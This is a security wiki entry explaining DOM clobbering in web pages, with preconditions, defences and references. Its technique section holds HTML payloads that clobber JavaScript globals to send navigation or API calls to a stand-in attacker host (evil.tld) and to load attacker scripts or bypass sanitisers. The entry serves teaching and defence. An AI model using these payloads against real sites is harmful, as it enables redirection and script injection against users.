---
title: DOM clobbering
slug: dom-clobbering
---

> **TL;DR:** HTML elements with `id` or `name` attributes become global JS properties; injecting `<a id=foo>` shadows `window.foo` and breaks code that read-checks a global before using it.

## What it is
The HTML spec exposes named elements as properties of `document` and (for forms) of `window` — `<a id="foo">` makes `window.foo` reference that anchor. If application JavaScript does `if (window.config) { ... } else { var config = {url: '/default'} }` or `let url = window.cfg?.url || '/safe'`, an attacker who can inject HTML — even sanitised HTML that drops `<script>` — can clobber the global and steer code into attacker-controlled URLs, eval gadgets, or sanitiser bypasses.

## Preconditions / where it applies
- A markup injection sink that allows tag attributes (typical: stored comments, profile bios, markdown renderers, MS Office HTML conversion).
- Application JS that reads from `window.X`, `document.X`, or `window.X.Y` without `var` / `let` initialisation, OR a sanitiser library (DOMPurify pre-2.4) that allows `id`/`name`.
- The clobbered global is used as a URL, function reference, or template (chain into [[dom-xss]], [[ssrf]], [[open-redirect]]).

## Technique
Simple single-level clobber — shadow `window.foo`:

```html
<a id="foo" href="https://evil.tld/x"></a>
<script>
// vulnerable code
location = window.foo;          // navigates to evil.tld/x
</script>
```

Nested clobber — shadow `window.cfg.endpoint`. Use a form with named children:

```html
<form id="cfg">
  <input name="endpoint" value="https://evil.tld/api">
</form>
<!-- now window.cfg.endpoint == the input element -->
<!-- and String(window.cfg.endpoint) coerces to the value attribute via toString tricks -->
```

Deeper nesting via `<form>` + `<iframe name>`:

```html
<form id="a"><output id="b" name="c">x</output></form>
<!-- window.a.b == output element; window.a.b.value == "x" -->
```

Real-world wins:

- Clobber `window.SOMELIB_CONFIG.cdn` to point a JS loader at attacker code (executes via `<script src>`).
- Clobber `document.currentScript.src` to swap a same-origin gadget into the next eval.
- Bypass sanitiser allowlists — DOMPurify CVE-2024-45801, 2020-26870 chain on `id`/`name` to overwrite the sanitiser's own internal config.

GitHub Pages, Bootstrap docs, and several markdown renderers have shipped DOM-clobbering RCE in the past 3 years.

## Detection and defence
- Declare every global with `let` / `const` at module top; never rely on `window.X` for trust decisions.
- Use Trusted Types ([[trusted-types-bypass]]) to force string coercion and reveal the wrong types early.
- Sanitiser: deny `id` and `name` on user-supplied HTML, or use DOMPurify with `SANITIZE_DOM: true` and `SANITIZE_NAMED_PROPS: true`.
- Strict CSP (`script-src 'self'` no `unsafe-inline`) so a clobbered loader URL still cannot run cross-origin scripts.
- Audit: grep for `window\.` and `document\.` accesses on the dynamic side of the codebase.

## References
- [PortSwigger – DOM clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering) — definitions and labs
- [Heyes – DOM clobbering strikes back](https://portswigger.net/research/dom-clobbering-strikes-back) — modern primitives and DOMPurify bypasses
- [HTML Living Standard – named access](https://html.spec.whatwg.org/multipage/dom.html#dom-document-nameditem) — normative behaviour
